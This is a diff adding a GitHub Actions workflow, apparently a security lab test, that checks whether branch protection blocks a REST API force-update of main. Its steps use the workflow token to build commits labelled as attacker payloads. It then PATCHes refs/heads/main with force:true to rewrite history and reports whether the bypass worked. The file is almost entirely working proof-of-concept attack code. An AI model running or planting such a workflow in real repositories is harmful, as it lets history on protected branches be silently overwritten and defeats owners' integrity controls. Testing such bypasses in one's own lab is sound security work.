@@ -1,0 +1,185 @@
+name: "Test 3: Branch Protection PATCH Bypass - force:true via REST API"
+
+# ===========================================================================
+# KEY LAB QUESTION: Does "Restrict force pushes" branch protection 
+# block PATCH /git/refs/heads/main with force:true via REST API?
+#
+# If repo has branch protection (restict force pushes) enabled:
+#   - git push --force → REJECTED by GitHub
+#   - PATCH /git/refs with force:true → ???
+#
+# Lab hypothesis: REST API PATCH bypasses branch protection entirely.
+# This workflow tests that specifically.
+#
+# Prerequisites: Branch protection should be enabled on this repo BEFORE
+# this workflow runs. The lab enables it externally via gh CLI, then 
+# this workflow fires and proves the bypass.
+# ===========================================================================
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  protection-bypass:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Audit branch protection state via API"
+        run: |
+          echo "=== BRANCH PROTECTION STATE ==="
+          BP=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/branches/main/protection" 2>&1)
+          echo "$BP" | jq '{
+            required_status_checks: .required_status_checks,
+            enforce_admins: .enforce_admins,
+            restrictions: (.restrictions | if . != null then "ENABLED" else "NONE" end),
+            allow_force_pushes: .allow_force_pushes,
+            allow_deletions: .allow_deletions
+          }' 2>/dev/null || echo "Protection response: $BP"
+
+      - name: "Build a real new commit (orphan-safe) to PATCH main to"
+        id: build_commit
+        run: |
+          # Get current state
+          MAIN=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/ref/heads/main")
+          MAIN_SHA=$(echo "$MAIN" | jq -r '.object.sha')
+          TREE_SHA=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$MAIN_SHA" \
+            | jq -r '.tree.sha')
+          echo "Current main: $MAIN_SHA"
+
+          # Create a blob with attacker content
+          BLOB=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d '{"content":"protection bypass test payload","encoding":"utf-8"}' \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" \
+            | jq -r '.sha')
+          echo "Blob: $BLOB"
+
+          # Create tree
+          TREE=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"base_tree\":\"$TREE_SHA\",\"tree\":[{\"path\":\"PROTECTION_BYPASS.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/trees" \
+            | jq -r '.sha')
+          echo "Tree: $TREE"
+
+          # Create commit (linear parent - NOT force, just advancing)
+          COMMIT=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"message\":\"ci: protection bypass test\",\"tree\":\"$TREE\",\"parents\":[\"$MAIN_SHA\"]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits" \
+            | jq -r '.sha')
+          echo "Commit: $COMMIT"
+          echo "main_sha=$MAIN_SHA" >> $GITHUB_OUTPUT
+          echo "commit_sha=$COMMIT" >> $GITHUB_OUTPUT
+
+      - name: "PATCH main with force:false (non-force, linear advance)"
+        id: patch_noforce
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/pnf.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.build_commit.outputs.commit_sha }}\",\"force\":false}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "PATCH force=false HTTP: $HTTP"
+          cat /tmp/pnf.json | jq '{sha:.object.sha,message:.message}' 2>/dev/null
+          echo "http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Build a HISTORY-REWRITING commit (orphan - force:true needed)"
+        id: orphan_commit
+        if: always()
+        run: |
+          # Build a commit whose parent is NOT current main (so PATCH needs force:true)
+          # Parent is the commit BEFORE main's current state (grandparent)
+          MAIN_SHA="${{ steps.build_commit.outputs.main_sha }}"
+          GRANDPARENT=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$MAIN_SHA" \
+            | jq -r '.parents[0].sha // empty')
+          if [ -z "$GRANDPARENT" ]; then
+            GRANDPARENT="$MAIN_SHA"
+          fi
+          echo "Building commit off grandparent: $GRANDPARENT"
+
+          TREE=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits/$GRANDPARENT" \
+            | jq -r '.tree.sha')
+
+          BLOB=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d '{"content":"history rewrite - force bypass payload","encoding":"utf-8"}' \
+            "https://api.github.com/repos/${{ github.repository }}/git/blobs" \
+            | jq -r '.sha')
+
+          NEW_TREE=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"base_tree\":\"$TREE\",\"tree\":[{\"path\":\"FORCE_BYPASS.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/trees" | jq -r '.sha')
+
+          ORPHAN=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"message\":\"hidden: history rewrite test\",\"tree\":\"$NEW_TREE\",\"parents\":[\"$GRANDPARENT\"]}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/commits" | jq -r '.sha')
+          echo "Orphan commit (rewrites history): $ORPHAN"
+          echo "orphan_sha=$ORPHAN" >> $GITHUB_OUTPUT
+
+      - name: "PATCH main with force:true (HISTORY REWRITE - should be blocked by protection)"
+        id: patch_force
+        if: always()
+        run: |
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/pf.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"${{ steps.orphan_commit.outputs.orphan_sha }}\",\"force\":true}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "PATCH force=true HTTP: $HTTP"
+          cat /tmp/pf.json | jq '{sha:.object.sha,message:.message}' 2>/dev/null
+          echo "http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Cleanup: restore main"
+        if: always()
+        run: |
+          ORIGINAL="${{ steps.build_commit.outputs.main_sha }}"
+          HTTP=$(curl -s -w "%{http_code}" -o /dev/null -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"$ORIGINAL\",\"force\":true}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs/heads/main")
+          echo "Restore main HTTP: $HTTP"
+
+      - name: "VERDICT: did branch protection block PATCH?"
+        if: always()
+        run: |
+          NF="${{ steps.patch_noforce.outputs.http }}"
+          F="${{ steps.patch_force.outputs.http }}"
+          echo "============================================================"
+          echo " BRANCH PROTECTION BYPASS VIA REST API PATCH - RESULTS"
+          echo "============================================================"
+          echo " PATCH force=false (linear advance) : $NF"
+          echo " PATCH force=true  (history rewrite): $F"
+          echo ""
+          if [ "$F" = "200" ]; then
+            echo "[BYPASS CONFIRMED] force:true PATCH succeeded despite 'Restrict force pushes'"
+            echo "Branch protection does NOT apply to REST API PATCH /git/refs"
+            echo "Impact: Any workflow with contents:write can silently rewrite history"
+          elif [ "$F" = "422" ] || [ "$F" = "403" ]; then
+            echo "[PROTECTED] force:true PATCH was blocked (HTTP $F)"
+            echo "Branch protection does apply to REST API in this case"
+          fi
